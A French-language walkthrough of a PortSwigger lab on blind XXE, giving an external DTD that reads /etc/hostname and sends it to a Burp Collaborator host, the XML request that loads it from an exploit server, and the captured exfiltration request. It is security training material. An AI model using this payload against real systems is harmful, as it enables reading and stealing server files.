# Lab

https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-exfiltration

## Solution

Pour ce lab, on doit utiliser un DTD externe qu'on peut heberger sur l'exploit serveur à l'URL `malicious.dtd` :

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://n1ptu79mtjo85m3mtxpky92lnct3hw5l.oastify.com/?x=%file;'>">
%eval;
%exfiltrate;
```

Ce DTD lorsqu'il sera utilisé et exécuté par le serveur, va créer une entité paramétrée `exfiltrate` qui va exécuter une requête HTTP GET vers l'URL `http://n1ptu79mtjo85m3mtxpky92lnct3hw5l.oastify.com/?x=%file;` avec la valeur de l'entité `%file` en paramètre qui contient le contenu du fichier `/etc/hostname`.

Pour l'executer, on peut utiliser la requête du check de stock pour lier le DTD externe :

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0aab00430348b42f855accb601f60011.exploit-server.net/malicious.dtd"> %xxe;]>
<stockCheck>
    <productId>1</productId>
    <storeId>1</storeId>
</stockCheck>
```

Et dans Burp Collaborator, on peut voir que le fichier `/etc/hostname` a été exfiltré :

```
GET /?x=2588c3bae973 HTTP/1.1
User-Agent: Java/17.0.5
Host: n1ptu79mtjo85m3mtxpky92lnct3hw5l.oastify.com
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: keep-alive
```

Le contenu du fichier `/etc/hostname` est `2588c3bae973`.